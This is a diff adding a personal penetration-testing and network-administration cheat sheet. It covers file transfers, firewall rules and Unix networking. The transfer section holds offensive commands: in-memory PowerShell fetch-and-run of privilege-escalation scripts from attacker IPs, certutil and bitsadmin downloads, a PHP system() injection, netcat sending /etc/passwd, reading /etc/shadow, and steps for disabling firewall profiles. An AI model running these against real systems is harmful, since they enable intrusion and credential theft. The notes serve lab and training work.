@@ -1,0 +1,2086 @@
+{{{ ###File Transfers
+{{{ #Bitsadmin
+	$ bitsadmin /transfer Ms16032Job /download http://10.10.14.60/Invoke-MS16032.ps1 C:\users\kostas\Downloads\Invoke-MS16032.ps1
+bitsadmin /transfer Ms16032Job /download http://10.10.14.60/Invoke-MS16032.ps1 C:\users\kostas\Downloads\Invoke-MS16032.ps1
+
+}}} #
+{{{ #Certutil
+	$ certutil.exe -urlcache -split -f "http://10.11.0.186:8000/MS16-032.ps1"
+certutil.exe -urlcache -split -f "http://203.0.113.5:32044/fpipe-win32.exe"
+
+}}} #
+{{{ #Copy/Paste
+	- Target 
+		$ base64 yeet.exe
+		- Copy Output
+	- OpStation 
+		- Whichever works
+		- Be sure to escape on an empty line
+		- User TeraTerm and set paste speed to 32
+		$ cat > yeet.exe.64			# Nix
+		$ more > yeet.exe.64		# Windows
+		$ copy con > yeet.exe.64	# Windows 
+			$ ctrl-z 
+		- Paste Output
+		$ ctrl-c
+		$ cat yeet.exe.64 | base64 -di > yeet.exe 
+	
+	- Potential base64 techniques
+		- Notes:
+			- Be Sure to slow down transfer. (TeraTerm)
+			- Use Full Screen
+		- Encode 
+			$ openssl enc -base64 
+			$ python -m base64 
+			$ certutil -encode
+			$ uuencode
+		- Decode
+			$ openssl enc -base64 -d 
+			$ python -m base64 -d
+			$ certutil -decode
+			$ uudecode
+
+}}} #
+{{{ #curl
+	- Generic Syntax 
+		$ curl http://sickos/test/ --upload-file /tmp/.curl.php -v
+		$ curl -s --data "<?system('whoami');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
+
+}}} #
+{{{ #netcat (nc)
+	- Forward
+		- Box 1 	$ nc -l 3232 < /etc/passwd 
+		- Box 2 	$ nc linux.ops.local 3232 > passwd 
+
+	- Reverse 
+		- Box 1		$ nc -l 3232 > passwd 
+		- Box 2		$ nc win7.ops.local 3232 < /etc/passwd 
+		- Box 1		$ ctrl-c
+		
+	- Notes:
+		- Binaries differ so,
+			$ nc -l 3232	# Is not working, try 
+			$ nc -l -p 3232
+		
+}}} #
+{{{ #ncat
+
+
+
+}}} #
+{{{ #PowerShell
+	{{{ #Bitstransfer
+		$ import-module bitstransfer
+		$ start-bitstransfer http://10.10.14.60:8000/yee.txt
+
+	}}} #
+	{{{ #In Memory
+		$ powershell.exe -exec Bypass "IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.186/Sherlock.ps1')"
+
+	}}} #
+
+	$ powershell -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.10.10.10:7000/iw4455.exe', 'C:\windows\temp\iw4455.exe')
+	
+	$ echo IEX(New-Object Net.WebClient).downloadString('http://10.11.0.186:8000/PowerUp.ps1')  | powershell -noprofile -
+	
+	$ C:\Windows\SysNative\WindowsPowershell\v1.0\powershell.exe -NoProfile -ExecutionPolicy unrestricted -Command (new-object System.Net.WebClient).Downloadfile('http://10.11.0.186/lse.sh','C:\HFS\sac\lse.sh')
+	
+	$ powershell -c Invoke-WebRequest "http://10.10.14.8/nc.exe" -Outfile "C:\temp\nc.exe"
+	
+	$ powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1
+
+}}} #
+{{{ #pscp
+	- Generic Syntax 
+		$ pscp root@192.168.11.11:/bin/cat .
+		$ pscp -P 2222 root@192.168.11.11:/bin/cat .
+
+}}} #
+{{{ #FTP
+	{{{ #Fun Facts
+	- Modes: 
+		> Active: Client Selects Callback port 
+			- Server initiates a connection with source port 20 to the client
+			- 
+		> Passive: Server Selects port Client should connect to 
+			- Client initiates a separate connection to the server on a random high port that the sides agree on.	<Gets around NAT
+		
+		- Old Windows FTP is only Active Mode (firewall problem)
+		- Nix seems to always use passive (Good for firewall bypass)
+	
+	}}} #
+	{{{ #POV Client 
+		- Generic Syntax 
+			$ ftp ftp.ops.local
+				$ bi 
+				$ cd pub
+				$ put yeet.exe 
+				$ get cannon.txt
+			
+		- Login and Set Port (Active)
+			$ nc 192.168.1.5 -l -p 25835
+			$ nc 192.168.1.5 21
+				$ USER squid
+				$ PASS yeet 
+				$ PORT 192,168,1,5,100,235 	#192.168.1.5:25835	#25835 = 100 × 256 + 235
+				$ LIST
+				$ CWD /pub/tools 
+				$ RETR yeet.txt		#nc -l -p 25835 > yeet.txt
+	
+		- Download all files 
+			- Active
+				$ wget --no-passive-ftp --mirror '[ftp://anonymous:anonymous@10.10.10.98'](ftp://anonymous:anonymous@10.10.10.98')  
+			- Passive
+				$ wget --mirror 'ftp://ftp_user:UTDRSCH53c"$6hys@10.10.10.59'  
+			
+	}}} #
+	{{{ #POV Server 
+		- On OpStation
+			$ apt-get install python-pyftpdlib
+			$ python -m pyftpdlib -p 21 -w
+		- On Target
+			$ echo import ftplib > yeet.txt
+			$ echo ftp=ftplib.FTP('10.11.0.186') >> yeet.txt                                                          	<<<CHANGE IP
+			$ echo ftp.login('anonymous','x') >> yeet.txt
+			$ echo ftp.retrbinary('RETR 3232.asp',open('3232.asp','wb').write) >> yeet.txt           					<<<REPLACE FILES
+			$ echo ftp.quit() >> yeet.txt
+		
+		- One Liner Compiled
+			$ echo open 192.168.119.132>ftp_commands.txt&echo anonymous>>ftp_commands.txt&echo password>>ftp_commands.txt&echo binary>>ftp_commands.txt&echo put 20210616120249_BloodHound.zip>>ftp_commands.txt&echo bye>>ftp_commands.txt&ftp -s:ftp_commands.txt
+		- Python One Liner Compiled 
+			$ c:\python27\python.exe -c "import ftplib;ftp=ftplib.FTP('10.11.0.186');ftp.login('anonymous','x');ftp.retrbinary('RETR 3232.asp',open('3232.asp','wb').write);ftp.quit()"
+	
+	}}} #
+
+
+}}} #
+{{{ #RDP
+	- Connect to RDP 
+		- expose internal port:
+			$ netsh interface portproxy add v4tov4 listenaddress=172.16.2.2 listenport=3389 connectaddress=127.0.0.1 connectport=80
+		- enable rdp
+			$ enable-psremoting
+			$ reg add "hklm\system\currentcontrolset\control\terminal server\fdenytsconnections" /v 0
+			$ shutdown /r /t 00 /f #May not be needed 
+		- Unix Connect 
+			$ xfreerdp /u:"administrator" /v:my.server.net:61220
+		- Windows Connect
+			$ mstsc
+			$ mstsc /v:127.0.0.1:2389	# On non-standard port
+	- Allow copy/paste 
+		- Note:
+			- Server allows copy/paste by default. Client does not. Enable by changing the RDP settings before you connect.
+			- https://www.google.com/search?q=windows+rdp+allow+copy+paste&ie=utf-8&oe=utf-8&client=firefox-b-1-ab
+	
+}}} #
+{{{ #SCP
+	- Generic Syntax 
+		$ scp -P 2222 /tmp/yeet.exe root@100.64.36.17:/opt/yeet.exe 
+	
+	- Socket Syntax 
+		- Single File 
+			$ scp -o ControlPath=/tmp/t5 dummy@127.0.0.1:"\"C:\Users\hugh.payne\My Documents\smbserver notes.rtf\"" .  
+			$ scp -o ControlPath=/tmp/t5 -T 'student14@127.0.0.1:"C:\Program Files\Common Files\system\ado\*.dll"' T5_ADO 
+		- Recursive
+			$ scp -r -o ControlPath=/tmp/t2 dummy@127.0.0.1:"\"C:\windows\prefetch\"" . 
+			$ scp -r -o ControlPath=/tmp/t2 dummy@127.0.0.1:"\"C:\windows\prefetch\*.dll"" . 
+			$ scp -T -r -o ControlPath=/tmp/t5 'dummy@127.0.0.1:"c:\program files (x86)\hmailserver\data\workgroup\*"' .			
+
+	- Sudo (Both need verified)
+		$ ssh user@ip "cat file" > file.txt  						
+		$ ssh -S /tmp/t6 dum "sudo -S cat /etc/shadow" > shadow  
+
+}}} #
+{{{ #SMB
+	- Share Folders
+		- Unix	# This will also dump you the users hash.
+			$ smbserver.py YEET `pwd` -smb2support -username squid -password squidpower
+			$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py tools `pwd`
+			$ python3 /usr/share/doc/python3-impacket/examples/smbserver.py -smb2support tools `pwd`	
+		- Windows 
+			$ net share mysharedfolder=c:\shared
+			$ net share /delete mysharedfolder
+		
+	- Mount Folders
+		- Unix 
+			$ smbclient '\\192.168.0.1\share$'
+		- Windows 
+			$ net use x: \\192.168.119.132\yeet /user:squid optionalpasswordstringhere
+			$ x:
+			$ net use x: /delete
+
+	- Possibly needed fixes
+		- Firewall
+			$ netsh advfirewall firewall set rule group="Network Discovery" new enable=Yes
+			$ netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=Yes
+		- Enable SMB1
+			$ Get-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol"
+			$ Enable-WindowsOptionalFeature -Online -FeatureName "SMB1Protocol-Client" -All
+			$ optionalfeatures.exe
+			
+	- Interact WithOut Mounting
+		$ dir \\192.168.11.5\tools\
+		$ copy \\192.168.11.5\tools\file.exe .
+		
+}}} #
+{{{ #TFTP	
+	- Pull from TFTP server 
+		$ tftp -i 192.168.1.102 GET nc.exe nc.exe
+
+}}} #
+{{{ #wget
+	- Generic Syntax
+		$ wget -O yeet.txt http://www.ops.local/cannon.txt 
+
+}}} #
+
+{{{ #FunFacts
+	- Windows shipped tools 
+		- ftp
+		- tftp
+		- tcp 
+	- Windows scp tools 
+		- winscp
+		- pscp 
+	
+
+
+
+
+
+
+
+
+
+}}} #
+
+}}} ###
+{{{ ###Firewalls
+{{{ #firewalld 
+	{{{ #Arguments
+		--get-default-zone								Query the current default zone.
+		--set-default-zone={ZONE}						Set the default zone (In both runtime and permanent config)
+		--get-zones										List all zones.
+		--get-active-zones								List all zones currently in use. (Have an interface or source tied to them)
+		--add-source={CIDR} [--zone={ZONE}]				Route all incoming traffic from the IP or network to the specified zone. Use default zone if not specified.
+		--remove-source={CIDR} [--zone={ZONE}]			Remove the source rule from a zone.
+		--add-interface={INTERFACE} [--zone={ZONE}]		Route all traffic from {INTERFACE} to the specified zone.
+		--change-interface={INTERFACE} [--zone={ZONE}]	Apply the interface to a different zone.
+		--list-all [--zone={ZONE}]						List all configured interfaces, sources, services, and ports for {ZONE}.
+		--list-all-zones								Retrieve all information for all zones.
+		--add-service={SERVICE} [--zone={ZONE}]			Allow incoming traffic to the port associated with {SERVICE}.
+		--add-port={PORT/PROTOCOL} [--zone={ZONE}]		Allow incoming traffic to the {PORT/PROTOCOL}.
+		--remove-service={SERVICE}						Remove {SERVICE} from the allowed list in a zone.
+		--remove-port={PORT/PROTOCOL} [--zone={ZONE}]	Remove allowed port from a zone.
+		--reload										Reload the permanent config into the runtime config. This will keep state information and will not interrupt established connections.
+		--add-masquerade								Enables masquerade or NAT for a zone.
+	}}} #
+	{{{ #Notes
+		- Logs to journald 
+		Zones	| Purpose
+		---		| ---
+		trusted	| Allows all incoming traffic
+		home	| Reject incoming traffic unless related to an already established connection or matches ssh, mdns, ipp-client, samba-client, or dhcpv6-client traffic.
+		internal| Reject incoming traffic unless it is related to an already established connection or matches ssh, mdns, ipp-client, samba-client, or dhcpv6-client traffic. (Same as home zone)
+		work	| Reject incoming traffic unless related to an established connection or matches ssh, ipp-client, or dhcpv6-client traffic.
+		public	| Reject incoming traffic unless related to an already established connection or matches ssh or dhcpv6-client traffic. (The default zone by default)
+		external| Reject incoming traffic unless related to an established connection or matches ssh traffic. Outgoing traffic forwarded through this zone is masqueraded to look like it originated from the address of the outgoing interface.
+		dmz		| Reject incoming traffic unless related to an established connection or matches ssh traffic.
+		block	| Reject incoming traffic unless related to an established connection.
+		drop	| Drop all incoming traffic unless related to an established connection.
+
+		- Order of Operations 
+			1. Source Address 
+			2. Incoming Interface
+			3. Default Zone (Public By Default)
+		
+		- Important Files 
+			- /usr/lib/firewalld/*				#Default Configs
+			- /etc/firewalld/					#User-Defined Configs
+			- /etc/firewalld/firewalld.conf		#User-Defined Config
+			- /etc/firewalld/services/*.xml 	#User-Defined Services 
+			- /etc/firewalld/zones/*.xml		#User-Defined Zones
+	}}} #
+	{{{ #Syntax		
+		- Get Configs 
+			$ firewall-cmd --list-all-zones 
+			$ iptables -nL -v 
+		- Get a zones rules 
+			$ firewall-cmd --list-all --zone=work 
+		- Read in Configs from Disk
+			$ firewall-cmd --reload
+		- Generic Rule add 
+			$ firewall-cmd --add-port53/udp 			#Edit Running Config  
+			$ firewall-cmd --add-port53/udp --permanent	#Edit Disk Config 
+		- Set Default Zone 
+			$ firewall-cmd --set-default-zone=dmz 
+		- Route Traffic from Network to Internal Zone 
+			$ firewall-cmd --permanent --zone=internal --add-source=192.168.1.0/24
+		- Allow MySql service into the internal zone 
+			$ firewall-cmd --permanent --zone=internal --add-service=mysql
+		- Rich 
+			- Block a Service
+				$ firewall-cmd --add-rich-rule 'rule family="ipv4" port port="22" protocol="tcp" reject'					#Default Zone 
+				$ firewall-cmd --zone=DMZ --add-rich-rule   'rule family="ipv4" port port="22" protocol="tcp" reject'		#Specified Zone 
+			- Remove a rule 
+				$ firewall-cmd --zone=DMZ --remove-rich-rule   'rule family="ipv4" port port="22" protocol="tcp" reject'
+			- Make temporary rule 
+				$ firewall-cmd --add-rich-rule='rule protocol value="icmp" accept' --timeout=60		#seconds
+			- Arguments 
+				- One Connection Per Minute 	$ limit value=1/m
+				- Match service file			$ service name=telnet
+				- Match Port 					$ port port="22"
+				- Log with prefix string		$ log prefix="SSH ACCESS" 
+				- Match ICMP					$ protocol value=icmp
+		- Direct 
+			- Get All direct rules 
+				$ firewall-cmd --direct --get-all-rules 
+			- Block Outgoing connection 
+				$ firewall-cmd --direct --add-rule ipv4 filter OUTPUT 0 -p tcp -d 192.168.7.125 -j DROP
+
+	}}} #
+
+}}} #		
+{{{ #ipfilter (ipmon)
+	- Solaris Firewall tool 
+	- Logging
+		> syslog.conf: local0.debug 	(Often /var/log/ipflog)
+	- Get Startup Configs 	
+		$ vi /etc/ipf/ipf.conf 
+	- Get Running Rules 
+		$ ipfstat -io 
+
+
+
+
+}}} #
+{{{ #iptables
+	{{{ #Arguments
+		- Tables 
+			-NAT 
+				> SNAT: (Source NAT) Rewrite Source IP 						#Output, PostRouting
+				> DNAT: (Destination NAT) Rewrite Destination IP			#PreRouting
+				> MASQUERADE: Rewrite Destination IP and Destination Port	#Output, PostRouting		#Often used with -i -o 
+		- Options
+			> -F: Flush all rules from the table 
+			> -X: Remove all user-defined chains from the filter table
+		- Actions:
+			> -L: View rules in the chain 
+			> -A: Add Rule 
+			> -I: Insert Rule 
+			> -R: Replace Rule 
+			> -D: Delete Rules
+			> -P: Set Default Policy					#Each Chain has a Default Policy (Accept or Drop)
+			> --line-numbers: Print with line numbers 
+			> -n: Don't resolve DNS
+		- Matching Rules 
+			> \!: Not next argument
+			> -p: Protocol		#icmp,tcp,udp,{1..255}
+			> -s: Source Address
+			> -d: Destination Address 
+			> -i: Local Interface for Inbound Traffic
+			> -o: Local Interface for Outbound Traffic 
+			> --sport: Souce Port 		#Must have -p tcp/udp also 
+			> --dport: Destination Port #Must have -p tcp/udp also 
+			> --icmp-type: 
+			> -m: Match
+				> --state: Stateful Relationship	#iptables -A INPUT -p tcp -m state --state ESTABLISHED, RELATED -j ACCEPT
+					> New: Starting a new Connection 						#Syn
+					> Established: Associated with Existing Connection 		#Syn/Ack
+					> Related: Starting a new Connection with an existing Connection (FTP)
+					> Invalid: Not Identified or was invalid given existing connection state
+				> --comment "Allow all loopback traffic": 
+		- Targets
+			> ACCEPT: Accept 
+			> DROP: Silently ignore
+			> REJECT: Drop with error message to the sending host
+			> LOG: Log 												#Processing Continues Afterwards
+			> CHAIN: Send to User Defined Chain	
+			> RETURN: Return to previous Calling Chain
+
+		}}} #
+	{{{ #Examples
+		{{{ #Generic Syntax 
+			- Template
+				$ iptables -t [table][options][action][matching rules][target]
+			- Get iptables rules
+				$ iptables -t [table] -nL --line-numbers -v
+			- Make Persistant
+				$ service iptables save
+				$ iptables-save				#outputs to screen so it can be forwarded into a file
+			- Delete Rule 
+				$ iptables -D INPUT 3
+			- Insert Rule 
+				$ iptables -I INPUT 23 -p tcp --dport 5222 -j ACCEPT
+			- Comment
+				$ iptables -A INPUT -s 192.168.1.1/32 -p tcp -m tcp --dport 80 -m comment --comment "office" -j ACCEPT			
+			
+		}}}
+
+		{{{ #Allow Established or Related Connections 
+			$ iptables -A INPUT -m state --state ESTABLISHED,RELATED -j ACCEPT
+			
+		}}} #
+		{{{ #Allow Port from a host 
+			- Generally
+				$ iptables -A INPUT -s 192.168.11.13 -p tcp --dport 22 -j ACCEPT  
+				$ iptables -A OUTPUT -d 192.168.11.13 -p tcp --sport 22 -j ACCEPT
+			- Statefully 
+				$ iptables -t filter -A INPUT -s 10.18.80.64/26 -p tcp --dport 22 -m state --state NEW,ESTABLISHED,RELATED -j ACCEPT 
+				$ iptables -t filter -A OUTPUT -d 10.18.80.64/26 -p tcp --sport 22 -m state --state ESTABLISHED,RELATED -j ACCEPT 
+			
+		}}} #
+		{{{ #Allow Firewall To communicate with itself
+			$ iptables -A INPUT -i lo -j ACCEPT
+			$ iptables -A OUTPUT -o lo -j ACCEPT
+			
+		}}} #
+		{{{ #Drop/Reject/Deny
+			$ iptables -A INPUT -p tcp -j REJECT --reject-with tcp-reset
+			$ iptables -t filter -A FORWARD -p udp -j REJECT --reject-with icmp-net-prohibited
+			$ iptables -A INPUT -p icmp -j DROP
+			$ iptables -A INPUT -d 192.168.11.13 \! -i eth0 -j DROP
+
+
+		}}} #
+		{{{ #Reset Rules 
+			$ iptables -t filter -F 
+			$ iptables -t nat -F
+			$ iptables -t filter -X 
+			$ iptables -P INPUT ACCEPT 
+			$ iptables -P OUTPUT ACCEPT 
+			$ iptables -P FORWARD ACCEPT
+			
+		}}}
+		{{{ #Set Default Policy
+			$ iptables -P INPUT DROP 
+			$ iptables -P FORWARD DROP
+			$ iptables -P OUTPUT ACCEPT
+			
+		}}}
+
+		{{{ #NAT 
+			- One-To-One NAT 
+				$ iptables -t nat -A POSTROUTING -s 192.168.111.116 -o eth2 -j SNAT --to-source 198.51.100.116
+				$ iptables -t nat -A PREROUTING -d 198.51.100.116 -i eth2 -j DNAT --to-destination 192.168.111.116
+			- One-To-One Nat (bible Example)
+				$ iptables -t nat -A POSTROUTING -o eth0 -j SNAT --to 128.138.101.4		#From internet (128...) to internal (eth0), make All internal machines use the external IP
+			- PAT (Port Address Translation)
+				$ iptables -t nat -A POSTROUTING -s 192.168.11.13 -o eth2 -j MASQUERADE
+				$ iptables -t filter -A FORWARD -s 192.168.11.13 -d ras.fatdeer.lab -p tcp --dport 22 -j ACCEPT
+				$ iptables -t filter -A FORWARD -d 192.168.11.13 -s ras.fatdeer.lab -m state --state ESTABLISHED,RELATED -j ACCEPT	
+				
+		}}} #
+		{{{ #Forward 
+			{{{ #Allow Access to a Port
+				$ iptables -A FORWARD -s 192.168.11.13 -d ras.fatdeer.lab -p tcp --dport 22 -j ACCEPT
+				$ iptables -A FORWARD -d 192.168.11.13 -s ras.fatdeer.lab -m state --state ESTABLISHED,RELATED -j ACCEPT
+				
+			}}} #
+			{{{ #Allow Access to a Port From One Host and not the rest of the network 
+				$ iptables -t filter -I FORWARD 1 -s win7.ops.local -d ad.ops.local -p tcp --dport 23 -m state --state NEW,RELATED,ESTABLISHED -j ACCEPT
+				$ iptables -t filter -I FORWARD 2 -s ad.ops.local -d win7.ops.local -p tcp --sport 23 -m state --state RELATED,ESTABLISHED -j ACCEPT
+				$ iptables -t filter -I FORWARD 3 -s 192.168.11.0/24 -d ad.ops.local -p tcp --dport 23 -j REJECT --reject-with tcp-reset
+				
+			}}} #	
+			{{{ #Allow ping to/from a forwarded host 
+				$ iptables -A FORWARD -s 192.168.111.116 -p icmp -j ACCEPT
+				$ iptables -A FORWARD -d 192.168.111.116 -p icmp -j ACCEPT
+				
+			}}} #
+			{{{ #Allow Two Networks to communicate
+				- Via interface 
+					$ iptables -A FORWARD -i eth0 -o eth1 -j ACCEPT
+					$ iptables -A FORWARD -i eth1 -o eth0 -j ACCEPT
+				- Via Address Range
+					$ iptables -A FORWARD -s 192.168.11.0/24 -d 192.168.111.112/29 -j ACCEPT
+					$ iptables -A FORWARD -d 192.168.11.0/24 -s 192.168.111.112/29 -j ACCEPT
+					
+			}}} #
+		
+		}}} #
+
+	}}} #
+	{{{ #Kernel Config
+		- Get current Value
+			$ sysctl net.ipv4.ip_forward
+			$ cat /proc/sys/net/ipv4/ip_forward (1 = enabled)
+		- Enable/Disable IP Packet Forwarding
+			$ sysctl -w net.ipv4.ip_forward = 1							# Enable
+			$ sysctl -w net.ipv4.ip_forward = 0							# Disable 
+		- Enable/Disable IPv4 routing	
+			$ sysctl -w net.ipv4.conf.all.forwarding=1					# Enable 
+			$ sysctl -w net.ipv4.conf.all.forwarding=0					# Disable
+		- Enable Source Route Verification 
+			$ sysctl -w net.ipv4.conf.default.rp_filter = 1				# Enable 
+			$ sysctl -w net.ipv4.conf.default.rp_filter = 0             # Disable
+		- Enable Source Routing
+			$ sysctl -w net.ipv4.conf.default.accept_source_route = 1	# Enable 
+			$ sysctl -w net.ipv4.conf.default.accept_source_route = 0	# Disable 
+		
+	}}}
+	{{{	#Notes
+		Table 	| Chanins						| Purpose 
+		---		| ---							| ---
+		filter 	| Input,Forward,Output			| Accepting or rejecting packets
+		nat 	| PreRouting,Output,PostRouting	| NAT
+		mangle 	| INPUT, FORWARD, POSTROUTING	| Packet ReWriting
+		raw		| PREROUTING, OUTPUT			| Circumventing the kernel's connection tracking mechanism
+		security| INPUT, FORWARD, OUTPUT		| Implementing Mandatory Access Control networking rules
+			
+		Chain		| Purpose
+		---			| ---
+		INPUT		| for packets destined to the local system
+		FORWARD		| for packets being routed through the system
+		OUTPUT		| for packets generated by local processes
+		PREROUTING	| for packets arriving via any network interface
+		POSTROUTING	| for packets as they are about to go out of the system
+		
+		- "Flags 0" Means match all.
+		> jump: goes to chain and will come back 
+		> goto: goes to chain and will not come back (if sent back it will be sent to previous chain)
+	
+	}}} #
+
+		
+}}} #
+{{{ #netsh advfirewall
+	- NOTES:
+		- On XP Disable the Entire Firewall 
+	- Get Firewall Status 
+		$ run multicommand -cl "netsh firewall show config"				#XP and Older
+		$ run multicommand -cl "netsh advfirewall show currentprofile"	#Newer than XP
+	- Show all profile states
+		$ netsh advfirewall show allprofiles
+	- Show active firewall profiles 
+		$ netsh advfirewall show currentprofile
+	- enable/disable firewall profiles
+		$ netsh advfirewall set allprofiles state off   #all
+		$ netsh advfirewall set public state off
+		$ netsh advfirewall set private state off
+	- Disable/enable active firewall profiles
+		$ netsh advfirewall set currentprofile state off
+		$ netsh advfirewall set currentprofile state on 
+	- show a firewall profiles rules
+		$ netsh advfirewall firewall show rule name=all 	#Get All Rules
+		$ netsh advfirewall firewall show rule profile=any name=all 
+		$ netsh advfirewall firewall show rule profile=private name=all
+		$ netsh advfirewall firewall show rule profile=private name=all > fwrules.txt	#To output to file (.wfw may be the correct extension)
+	- Enable/Disable rule group for all profiles 
+		$ netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=no
+		$ netsh advfirewall firewall set rule group="File and Printer Sharing" new enable=yes
+		* If you want to enable a rule group for a profile, Each rule needs to be done individually
+		- List rules of that group 
+			$ netsh advfirewall firewall show rule name="File and printer Sharing (NB-Session-In)" | findstr "Rule Name:"
+		- enable a rule for a group 
+			$ netsh advfirewall firewall set rule name="File and Printer Sharing (NB-Session-In)" new enable=yes profile=domain,public
+	- Enable an existing rule
+		$ netsh advfirewall firewall set rule name="Ping-ICMPv4 Echo" new enable=yes
+	- Create/Delete specific Inbound IP/Port Destination IP/Port rule
+		$ netsh advfirewall firewall add rule name="1337 4hx" dir=in protocol=tcp localport=31337 remoteport=6666 remoteip=192.168.11.14 profile=private action=allow
+		$ netsh advfirewall firewall delete rule name="1337 4hx"
+	- Create rule for program
+		$ netsh advfirewall firewall add rule program="c:\program files (x86)\Mozilla Firefox\firefox.exe" name="FOX" enable=yes dir=in action=allow profile=public
+	- Import Configs
+		$ netsh advfirewall import "c:\FW-Before-Changes.wfw"
+		$ netsh advfirewall export "c:\FW-Before-Changes.wfw"
+	- Enable firewall logging
+		$ netsh firewall set logging droppedpackets=enable connections=enable
+	
+	- PowerShell 
+		- Allow Inbound connection to port 3232
+			$ New-NetFirewallRule -DisplayName 'nc remote connect' -profile Any -Direction Inbound -Action allow -Protocol TCP -localport 3232	
+
+}}} #
+
+}}} ###
+{{{ ###OS Specific 
+{{{ #Nix
+	{{{ #arp
+		- Get Arp Cache
+			- CentOS 
+				$ arp -a
+				$ arp -vn 
+			- Solaris 
+				$ arp -an 
+		- Add Static Entry 
+			- CentOS 
+				$ arp -s 172.18.31.12 00:50:56:0D:01:12	#Running
+			- Solaris 
+				$ arp -s 172.18.31.12 00:50:56:0D:01:12	#Running 
+		- Flush individual entries	
+			- CentOS 
+				$ arp -d 172.17.31.12
+			- Solaris 
+				$ arp -d 172.17.31.12
+		- Flush all entries
+			- CentOS
+				$ ip -s -s neigh flush all	#Most scalable way to flush
+				$ ip neigh flush all	#Not as scalable
+			- Solaris 
+		- Network Arp discovery
+			$ nmap -PR 192.168.11.5/24
+
+	}}} #
+	{{{ #Change Network Settings 
+		{{{ #Change IP/Netmask 
+			- CentOS
+				$ ip addr add 192.168.1.1/24 dev eth1					#Running 
+				$ ifconfig eth0 172.18.31.13 netmask 255.255.255.0 up	#Running 
+				$ vim /etc/sysconfig/network-scripts/ifcfg-eth0			#Persistant
+				$ sed -i 's/IPADDR=.*/IPADDR=192.168.11.13/' /etc/sysconfig/network-scripts/ifcfg-eth0 && service network reload #Persistant and Running 
+			- Solaris
+				$ ifconfig e1000f0 172.18.31.14 netmask 255.255.255.0 up 	#Running 
+				$ vi /etc/hosts; vi /etc/netmasks	#Persistant 
+		}}} #
+		{{{ #Change Default Gateway 
+			- CentOS 
+				$ route add default gw 172.18.31.253 	#Running 
+				$ vim /etc/sysconfig/network 			#Persistant 	#GATEWAY=
+			- Solaris 
+				$ route add default 172.18.31.253; route delete default 192.168.11.254 	#Running 
+				- if using /etc/defaultrouter 
+					$ echo 172.18.31.253 > /etc/defaultrouter	#Persistant 
+				- if using /etc/gateways
+					$ echo 'net 0.0.0.0 gateway 192.168.11.254 metric 1 passive' > /etc/gateways; rm /etc/defaultrouter; touch /etc/notrouter 	#Persistant
+		}}} #
+		{{{ #Change Interface state 
+			- CentOS 
+				$ ifconfig eth0 down 	#Running
+				$ ifconfig eth0 up 		#Running 
+				$ ifdown 				#Clears all Running configs on the interface 
+				$ ifup					#Reads from disk to load configs
+			- Solaris 
+				$ ifconfig e1000g0 down		#Running 
+				$ ifconfig e1000g0 up		#Running 
+		}}} #
+		{{{ #Change MAC address (spoof)
+			- CentOS 
+				$ ifconfig eth0 hw ether 00:50:56:0D:01:14		#Running #Bring Down interface first
+				$ vim /etc/sysconfig/network-scripts/ifcfg-eth0	#Persistant	#Don't change HWADDR. Add a MACADDR=00:50:56:0D:01:13 line
+			- Solaris 
+				$ ifconfig e1000g0 ether 00:50:56:0D:01:14	#Running #Bring Down interface first 
+				$ echo 'yeet ether 00:50:56:0D:01:14' > /etc/hostname.e1000g0 	#Persistant
+		}}} #
+		{{{ #Change DHCP status 
+			- CentOS 
+				$ dhclient eth0 	#Running 
+				$ dhcpcd eth0 		#Running 
+				$ dhclient -r eth0 	#Release IP 
+				$ vim /etc/sysconfig/network-scripts/ifcfg-eth0	#Persistant #BOOTPROTO=DHCP, remove IPADDR=, PREFIX=, NETMASK=, GATEWAY=
+			- Solaris 
+				$ ifconfig e1000g0 dhcp start 	#Running 
+				$ ifconfig e1000g0 dhcp release	#Running (Turns DHCP off)
+				$ touch /etc/dhcp.e1000g0		#Persistant
+		}}} #
+		{{{ #Change hostname 
+			- CentOS 
+				$ hostname yeeet 	#Running
+				$ vim /etc/sysconfig/hostname; vim /etc/sysconfig/network; vim /etc/hosts	#Persistant 			
+			- Solaris 
+				$ hostname yeeet	#Running 
+				$ vi /etc/hostname; vi /etc nodename; vi /etc/hosts 	#Persistant
+		}}} #	
+		{{{ #Get Network Profiles 
+			- CentOS 
+				$ ls /etc/sysconfig/networking/devices /etc/sysconfig/networking/profiles/default 
+
+		}}} #
+
+	}}} #
+	{{{ #DNS
+		{{{ #Change DNS Settings 
+			- CentOS 
+				$ echo -e 'domain fatdeer.lab\nnameserver 192.0.2.2' > /etc/resolv.conf 	#Persistant and Running
+			- Solaris 
+				$ echo -e 'domain fatdeer.lab\nnameserver 192.0.2.2' > /etc/resolv.conf 	#Persistant and Running
+		}}} #
+		{{{ #Initial Enumeration
+			##These are the commands I run every time I see an open DNS port
+			$ dnsrecon -r 127.0.0.0/24 -n {IP} -d {Domain_Name}
+			$ dnsrecon -r 127.0.1.0/24 -n {IP} -d {Domain_Name}
+			$ dnsrecon -r {Network}{CIDR} -n {IP} -d {Domain_Name}
+			$ dig axfr @{IP}
+			$ dig axfr {Domain_Name} @{IP}
+			$ nslookup
+			$	SERVER {IP}
+			$	127.0.0.1
+			$	{IP}
+			$	Domain_Name
+			$	exit
+			
+		}}} #
+		{{{ #Troubleshoot DNS
+			- Resolve as your machine would 
+				$ getent ahosts yeet.wtf 
+			- Resolve using configured nameserver 
+				$ nslookup yee.wtf 
+			- Resolve using a specific DNS server 
+				$ dig 8.8.8.4 yee.wtf 
+		
+		}}} #
+
+	}}} #
+	{{{ #netstat
+		- Get Established and Listening Connections 
+			- CentOS
+				$ netstat -natup
+				- n:no dns lookup a:all t:tcp u:udp p:Process With open sockets
+				$ ss -natup 
+				$ ss -A tcp,udp,packet
+				$ lsof -i 
+			- Solaris 
+				$ netstat -an -f inet -P tcp 
+				$ netstat -an -P tcp 
+
+		- Get UDP Socket Table 
+			- CentOS 
+				$ netstat -natup 
+			- Solaris 
+				$ netstat -an -f inet -P udp
+				
+	}}} #
+	{{{ #ping
+		#ping Broadcast
+			$ ping -b 192.168.11.255
+	
+	}}} #
+	{{{ #Routing
+		- Get Routes from Disk 
